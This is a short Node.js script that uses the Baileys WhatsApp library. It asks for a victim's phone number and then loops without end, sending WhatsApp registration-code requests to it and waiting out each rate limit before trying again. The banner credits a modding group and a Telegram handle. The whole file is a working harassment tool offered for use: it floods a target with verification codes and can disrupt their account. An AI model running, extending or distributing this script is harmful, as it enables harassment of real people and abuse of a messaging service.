const prompt = require('prompt-sync')();
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs')

const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbers = JSON.parse(fs.readFileSync('./files/numbers.json'));

const start = async () => {

  const { state, saveCreds } = await useMultiFileAuthState('.oiii')

  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  })
  //console.clear();
  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    while (true) {
      try {
      console.clear();
      console.log(gradient('red', 'blue')('PROSES GA SIEH: +' + ddi + number))
        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724
        })
        b = (res.reason === 'temporarily_unavailable');
        if (b) {
          setTimeout(async () => {
            dropNumber(context)
          }, res.retry_after * 1000)
          return;
        }
      } catch (error) {
        //console.log(error)
      }
    }

  }
  console.clear();
  console.log(gradient('black', 'black')('BY ./✩░▒▓▆▅▃▂▁𝐀𝐤𝐦𝐚𝐥𝐌𝐨𝐝𝐬▁▂▃▅▆▓▒░✩'))
  console.log(gradient('purple', 'cyan')('TELEGRAM : @Darkfamly'))
  console.log(gradient('black', 'black')('BY ./✩░▒▓▆▅▃▂▁𝐀𝐤𝐦𝐚𝐥𝐌𝐨𝐝𝐬▁▂▃▅▆▓▒░✩'))
  let ddi = prompt(gradient('purple', 'cyan')('[+] Masukan code negara 62: '));
  let number = prompt(gradient('purple', 'cyan')('[+] Masukan nomor : '))
  let phoneNumber = ddi + number;
  numbers[phoneNumber] = { ddi, number }
  fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'));
  dropNumber({ phoneNumber, ddi, number })
console.clear();
}
start();
